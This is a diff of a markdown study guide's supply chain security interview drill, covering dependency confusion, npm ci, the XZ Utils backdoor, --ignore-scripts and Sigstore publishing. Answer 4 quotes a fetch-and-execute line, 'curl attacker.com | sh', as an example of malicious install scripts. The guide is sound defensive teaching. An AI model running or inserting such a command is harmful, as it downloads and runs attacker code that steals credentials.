@@ -184,10 +184,9 @@ A **Software Bill of Materials (SBOM)** is a machine-readable, nested inventory 
 
 ---
 
-## 7. Interview Drill: Supply Chain Defense
+## Interview Drill
 
-<details>
-<summary>1. Explain how a Dependency Confusion attack works against an enterprise build pipeline, and what specific configuration changes eliminate it.</summary>
+<details><summary>1. Explain how a Dependency Confusion attack works against an enterprise build pipeline, and what specific configuration changes eliminate it.</summary>
 
 Dependency Confusion occurs because modern package managers query both an internal corporate repository and the public registry. If an enterprise uses a private package `@corp/auth-lib` at version `1.2.0`, an attacker uploads a package named `@corp/auth-lib` to the public `npmjs.org` registry with version `99.9.9`. When the corporate build executes `npm install`, the package manager considers the public `99.9.9` release newer than the internal `1.2.0`, fetches the attacker's public package, and executes its malicious `postinstall` script inside the corporate build network. _Elimination_:
 
@@ -197,8 +196,7 @@ Dependency Confusion occurs because modern package managers query both an intern
 
 </details>
 
-<details>
-<summary>2. Why does running `npm install` in a CI/CD build pipeline represent a critical security vulnerability compared to `npm ci`?</summary>
+<details><summary>2. Why does running `npm install` in a CI/CD build pipeline represent a critical security vulnerability compared to `npm ci`?</summary>
 
 `npm install` is non-deterministic:
 
@@ -207,20 +205,17 @@ Dependency Confusion occurs because modern package managers query both an intern
 
 </details>
 
-<details>
-<summary>3. What was unique about the attack vector used in the XZ Utils (CVE-2024-3094) backdoor compared to standard typosquatting?</summary>
+<details><summary>3. What was unique about the attack vector used in the XZ Utils (CVE-2024-3094) backdoor compared to standard typosquatting?</summary>
 
 Standard typosquatting relies on hasty developer typos and obvious names. The XZ Utils attack was a state-sponsored, multi-year social engineering operation targeting a core upstream library. The threat actor invested over two years making high-quality, legitimate open-source contributions to gain commit access and maintainer trust. The malicious code was never committed to the public Git repository; it was injected exclusively into the release tarballs generated for Linux distribution packagers as obfuscated binary test data. The build-time M4 macros modified the compiled `liblzma.so` library to hook GNU IFUNC symbol resolution in OpenSSH daemon memory, creating an unauthenticated root backdoor.
 </details>
 
-<details>
-<summary>4. Why should production Docker container builds and CI/CD runners always specify `--ignore-scripts`?</summary>
+<details><summary>4. Why should production Docker container builds and CI/CD runners always specify `--ignore-scripts`?</summary>
 
 When a package is installed, npm executes any lifecycle hooks defined in `package.json` (`preinstall`, `install`, `postinstall`). Malicious packages use these scripts to execute shell commands (`curl attacker.com | sh`), stealing environment variables, cloud credentials, and SSH keys. Adding `--ignore-scripts` disables all automatic lifecycle script execution during `npm install` or `npm ci`. The build engine unpacks files safely without executing arbitrary third-party code.
 </details>
 
-<details>
-<summary>5. How does Sigstore Trusted Publishing eliminate the risk of compromised developer credentials in package registries?</summary>
+<details><summary>5. How does Sigstore Trusted Publishing eliminate the risk of compromised developer credentials in package registries?</summary>
 
 Historically, developers stored long-lived, high-privilege personal access tokens or passwords in local configuration files (`~/.npmrc`) to publish packages. If a developer's laptop was compromised or an API key leaked, attackers published malicious releases directly. With Sigstore Trusted Publishing, developer credentials are completely eliminated. The package registry establishes an OpenID Connect (OIDC) trust relationship with the GitHub Actions workflow. When a release is triggered, GitHub Actions generates an ephemeral OIDC token proving that the build is running on an authorized runner from a tagged commit. Sigstore issues a short-lived cryptographic certificate, signs the provenance attestation, and npm publishes the package without any human ever touching or storing a static password.
 </details>
